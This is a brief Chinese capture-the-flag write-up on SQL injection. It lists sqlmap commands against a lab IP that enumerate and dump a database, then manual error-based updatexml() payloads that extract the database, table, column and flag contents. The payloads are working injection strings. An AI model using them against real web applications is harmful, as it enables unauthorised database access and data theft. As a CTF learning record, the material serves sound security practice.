#SQL 注入 #报错注入

可以用 sqlmap 跑 👍

```sh
sqlmap -u “http://1.14.71.254:28199/index.php?id=1” --dbs
sqlmap -u “http://1.14.71.254:28199/index.php?id=1” -D test_db --tables
sqlmap -u “http://1.14.71.254:28199/index.php?id=1” -D test_db -T test_tb --columns
sqlmap -u “http://1.14.71.254:28199/index.php?id=1” -D test_db -T test_tb -C flag --dump
```

报错注入
尝试

```sql
-- 获取当前数据库

?id=1' and updatexml(1,concat('~',(select database()),'~'),1)--+
```

![[Pasted image 20230130170645.png]]

```sql
-- 获取表

?id=1' and updatexml(1,concat('~',(select table_name from information_schema.tables where table_schema='test_db' limit 0,1),'~'),1)--+
```

![[Pasted image 20230130170921.png]]

```sql
-- 获取列

?id=1' and updatexml(1,concat('~',(select column_name from information_schema.columns where table_name='test_tb' limit 1,1),'~'),1)--+
```

![[Pasted image 20230130171704.png]]

```sql
-- 获取字段

?id=1' and updatexml(1,concat(0x7e,(select flag from test_tb)),1)%23

0x7e : ~     %23 : #
```

只有一半，接着就用 right()、left()函数截取就 OK

```sql
?id=1' and updatexml(1,concat(0x7e,(select right(flag,30) from test_tb)),1)%23
```
